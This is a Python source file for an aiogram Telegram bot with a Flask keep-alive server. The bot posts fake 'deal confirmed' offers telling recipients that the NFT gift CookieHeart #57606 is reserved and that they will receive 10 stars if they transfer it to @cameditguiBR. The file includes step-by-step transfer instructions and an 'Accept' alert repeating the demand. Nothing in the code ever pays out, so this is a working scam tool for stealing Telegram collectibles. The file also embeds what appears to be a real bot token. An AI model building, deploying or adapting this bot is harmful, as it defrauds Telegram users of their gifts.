import asyncio
import logging
import os
import threading
from flask import Flask
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton

# ВСТАВЬ СВОЙ ТОКЕН БОТА
BOT_TOKEN = "9132464891:AAGlMnS0IUaM1ubiDF033sMuyll8kum2tM0"
BOT_USERNAME = "@Gift_OfferBot"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is alive!", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
# ------------------------------

@dp.inline_query()
async def inline_offer(query: types.InlineQuery):
    nft_link = "https://t.me/nft/CookieHeart-57606"
    
    # Подставляем имя того, кто создал оффер
    sender_name = query.from_user.first_name or "Пользователь"
    if query.from_user.username:
        sender_name = f"@{query.from_user.username}"
    
    text = (
        f"с помощью {BOT_USERNAME}\n"
        f"🎁 **Сделка подтверждена.**\n\n"
        f"Подарок **CookieHeart #57606** зарезервирован.\n"
        f"Чтобы получить 10 ⭐, отправьте его на аккаунт сделки @cameditguiBR.\n\n"
        f"Как передать подарок:\n"
        f"1. Откройте Профиль → Подарки в Telegram.\n"
        f"2. Выберите CookieHeart #57606.\n"
        f"3. Нажмите «Передать».\n"
        f"4. Укажите получателя @cameditguiBR.\n\n"
        f"Предложение от: {sender_name}\n"
        f"{nft_link}"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Принять", callback_data=f"accept_{sender_name}")]
    ])
    
    result = InlineQueryResultArticle(
        id="offer_1",
        title="Создать оффер",
        description="Нажми, чтобы отправить предложение",
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode="Markdown",
            disable_web_page_preview=False
        ),
        reply_markup=kb
    )
    
    await query.answer([result], cache_time=1)

@dp.callback_query(F.data.startswith("accept_"))
async def accept_offer(callback: types.CallbackQuery):
    # Достаем имя отправителя из callback_data
    sender_name = callback.data.split("_")[1]
    
    # Показываем то самое всплывающее окно (Alert) с новым юзером
    await callback.answer(
        text=f"Оффер принят!\n\nПередайте подарок на аккаунт:\n@cameditguiBR\n\nСумма предложения: 10 ⭐\n\nСоздатель оффера: {sender_name}",
        show_alert=True
    )

async def main():
    logging.basicConfig(level=logging.INFO)
    threading.Thread(target=run_flask, daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())